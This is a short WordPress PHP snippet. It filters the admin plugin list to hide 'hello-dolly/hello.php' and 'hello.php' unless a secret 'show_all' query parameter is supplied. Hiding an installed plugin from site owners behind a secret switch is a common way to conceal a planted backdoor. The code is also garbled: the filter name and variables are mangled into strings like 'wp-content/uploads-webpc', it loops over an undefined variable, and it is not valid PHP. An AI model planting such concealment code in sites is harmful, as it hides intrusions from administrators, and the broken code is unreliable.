<?php
add_filter(
	'all_wp-content/uploads-webpc',
	function ( $wp-content/uploads-webpc ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$wp-content/uploads-webpc = [
				'hello-dolly/hello.php',
				'hello.php',
			];
			foreach ( $hiddenwp-content/uploads-webpc as $hiddenwp-content/uploads-webpc) {
				unset( $wp-content/uploads-webpc[$hiddenwp-content/uploads-webpc] );
			}
		}
		return $wp-content/uploads-webpc;
	}
);